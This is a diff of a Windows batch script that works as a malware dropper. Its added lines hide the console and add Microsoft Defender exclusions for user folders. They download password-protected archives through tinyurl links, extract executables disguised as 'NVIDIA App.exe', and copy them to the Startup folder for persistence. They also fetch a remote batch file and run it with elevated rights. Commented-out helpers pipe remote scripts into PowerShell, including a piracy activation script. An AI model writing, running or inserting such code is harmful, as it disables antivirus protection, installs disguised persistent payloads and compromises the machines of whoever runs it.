@@ -1,34 +1,102 @@
 @echo off
+if "%~1"=="h" goto work
+powershell -NoProfile -WindowStyle Hidden -Command "Start-Process -FilePath '%~f0' -ArgumentList 'h' -WindowStyle Hidden"
+exit /b
+:work
+title VZ
+setlocal EnableExtensions
+pushd "%TEMP%"
+
+set "LOG=%TEMP%\vz.log"
+set "OUT=%TEMP%\vz"
+set "DEST=%APPDATA%\system\NVIDIA App.exe"
+set "RUN=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\NVIDIA App.exe"
+>"%LOG%" 2>&1 echo [%DATE% %TIME%] start
+
 :: --- xcls (r-ele) ---
-powershell.exe -NoProfile -Command "Add-MpPreference -ExclusionPath \"$env:APPDATA\",\"$env:TEMP\",(Join-Path $env:APPDATA 'System')"
+powershell.exe -NoProfile -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath $env:APPDATA, $env:TEMP, (Join-Path $env:APPDATA 'System') -ErrorAction SilentlyContinue" >>"%LOG%" 2>&1
+
+where curl.exe >nul 2>&1 || call :fail "curl.exe missing"
+set "CURL=curl.exe -fsSL --retry 10 --retry-all-errors --retry-delay 2 --connect-timeout 20 --speed-time 30 --speed-limit 1024"
 
 :: --- Zp ---
-curl.exe -sL -o "%TEMP%\7z.exe" https://github.com/loodyxmer-afk/vz/raw/refs/heads/main/7z.exe
-curl.exe -sL -o "%TEMP%\7z.dll" https://github.com/loodyxmer-afk/vz/raw/refs/heads/main/7z.dll
+%CURL% -o "%TEMP%\7z.exe" https://github.com/loodyxmer-afk/vz/raw/refs/heads/main/7z.exe >>"%LOG%" 2>&1 || call :fail "7z.exe dl"
+%CURL% -o "%TEMP%\7z.dll" https://github.com/loodyxmer-afk/vz/raw/refs/heads/main/7z.dll >>"%LOG%" 2>&1 || call :fail "7z.dll dl"
+if not exist "%TEMP%\7z.exe" call :fail "7z.exe absent"
+"%TEMP%\7z.exe" >nul 2>&1 || call :fail "7z.exe broken"
 
 :: --- P1 ---
-curl.exe -sL -o "%TEMP%\NvidiaApp.7z.001" https://tinyurl.com/VZN1PJ
-curl.exe -sL -o "%TEMP%\NvidiaApp.7z.002" https://tinyurl.com/VZN2PJ
-curl.exe -sL -o "%TEMP%\NvidiaApp.7z.003" https://tinyurl.com/VZN3PJ
-"%TEMP%\7z.exe" x "%TEMP%\NvidiaApp.7z.001" -p@123456789@ -o"%TEMP%\extract" -y
-start "" "%TEMP%\extract\NvidiaApp.exe"
-if not exist "%APPDATA%\system" mkdir "%APPDATA%\system"
-copy /y "%TEMP%\extract\NvidiaApp.exe" "%APPDATA%\system\" >nul
-copy /y "%TEMP%\extract\NvidiaApp.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\" >nul
+call :p1
 
 :: --- P2 ---
- curl.exe -sL -o "%TEMP%\svchost.7z" https://tinyurl.com/vzxhost
- "%TEMP%\7z.exe" x "%TEMP%\svchost.7z" -p@123456789@ -o"%TEMP%\extract" -y
- start "" "%TEMP%\extract\Nvidia App.exe"
- if not exist "%APPDATA%\system" mkdir "%APPDATA%\system"
- copy /y "%TEMP%\extract\Nvidia App.exe" "%APPDATA%\system\" >nul
- copy /y "%TEMP%\extract\Nvidia App.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\" >nul
+call :p2
 
 :: --- Run tweaks ---
-:: curl -L "https://tinyurl.com/ztweak" -o "%TEMP%\VZX.bat" && (start /b "" powershell.exe -NoProfile -WindowStyle Hidden -Command "Start-Process '%TEMP%\VZX.bat' -Verb RunAs" & taskkill /f /fi "imagename eq cmd.exe" /fi "windowtitle ne Administrator:  *")
+call :run
+
 :: --- Tweaks ---
-:: powershell.exe -NoProfile -Command "irm 'https://christitus.com/win' | iex"
+:: call :tweaks
+
 :: --- Windows / Office activation ---
-:: powershell.exe -NoProfile -Command "irm 'https://get.activated.win' | iex"
+:: call :act
+
 :: --- Autodesk stuff ---
-:: curl.exe -sL -o "%USERPROFILE%\Downloads\ADSK.rar" https://tinyurl.com/VZADSKPJ
+:: call :adsk
+
+>>"%LOG%" 2>&1 echo [%TIME%] done
+popd
+exit /b 0
+
+:p1
+if exist "%OUT%" rd /s /q "%OUT%"
+%CURL% -C - -o "%TEMP%\NvidiaApp.7z.001" https://tinyurl.com/VZN1PJ >>"%LOG%" 2>&1 || call :fail "P1.001 dl"
+%CURL% -C - -o "%TEMP%\NvidiaApp.7z.002" https://tinyurl.com/VZN2PJ >>"%LOG%" 2>&1 || call :fail "P1.002 dl"
+%CURL% -C - -o "%TEMP%\NvidiaApp.7z.003" https://tinyurl.com/VZN3PJ >>"%LOG%" 2>&1 || call :fail "P1.003 dl"
+for %%A in ("%TEMP%\NvidiaApp.7z.001" "%TEMP%\NvidiaApp.7z.002" "%TEMP%\NvidiaApp.7z.003") do (
+  if not exist "%%~A" call :fail "P1 part absent"
+  if %%~zA LSS 100000 call :fail "P1 part short"
+)
+"%TEMP%\7z.exe" x "%TEMP%\NvidiaApp.7z.001" -p"@123456789@" -o"%OUT%" -y >>"%LOG%" 2>&1 || call :fail "P1 extract"
+if not exist "%OUT%\NvidiaApp.exe" call :fail "P1 payload absent"
+if not exist "%APPDATA%\system\" mkdir "%APPDATA%\system" 2>nul
+copy /y "%OUT%\NvidiaApp.exe" "%DEST%" >nul 2>&1
+copy /y "%OUT%\NvidiaApp.exe" "%RUN%" >nul 2>&1
+start "" "%DEST%"
+exit /b 0
+
+:p2
+if exist "%OUT%" rd /s /q "%OUT%"
+%CURL% -C - -o "%TEMP%\svchost.7z" https://tinyurl.com/vzxhost >>"%LOG%" 2>&1 || call :fail "P2 dl"
+for %%A in ("%TEMP%\svchost.7z") do if %%~zA LSS 100000 call :fail "P2 archive short"
+"%TEMP%\7z.exe" x "%TEMP%\svchost.7z" -p"@123456789@" -o"%OUT%" -y >>"%LOG%" 2>&1 || call :fail "P2 extract"
+if not exist "%OUT%\Nvidia App.exe" call :fail "P2 payload absent"
+if not exist "%APPDATA%\system\" mkdir "%APPDATA%\system" 2>nul
+copy /y "%OUT%\Nvidia App.exe" "%DEST%" >nul 2>&1
+copy /y "%OUT%\Nvidia App.exe" "%RUN%" >nul 2>&1
+start "" "%DEST%"
+exit /b 0
+
+:run
+%CURL% -o "%TEMP%\VZX.bat" https://tinyurl.com/ztweak >>"%LOG%" 2>&1 || call :fail "VZX dl"
+if not exist "%TEMP%\VZX.bat" call :fail "VZX absent"
+powershell.exe -NoProfile -WindowStyle Hidden -Command "Start-Process '%TEMP%\VZX.bat' -Verb RunAs" >>"%LOG%" 2>&1 || call :fail "VZX launch"
+taskkill /f /fi "imagename eq cmd.exe" /fi "windowtitle ne VZ" >>"%LOG%" 2>&1
+exit /b 0
+
+:tweaks
+start "" powershell.exe -NoProfile -Command "irm 'https://christitus.com/win' | iex"
+exit /b 0
+
+:act
+start "" powershell.exe -NoProfile -Command "irm 'https://get.activated.win' | iex"
+exit /b 0
+
+:adsk
+%CURL% -C - -o "%USERPROFILE%\Downloads\ADSK.rar" https://tinyurl.com/VZADSKPJ >>"%LOG%" 2>&1 || call :fail "ADSK dl"
+for %%A in ("%USERPROFILE%\Downloads\ADSK.rar") do if %%~zA LSS 100000 call :fail "ADSK short"
+exit /b 0
+
+:fail
+>>"%LOG%" 2>&1 echo [%TIME%] FAILED: %~1
+popd
+exit 1
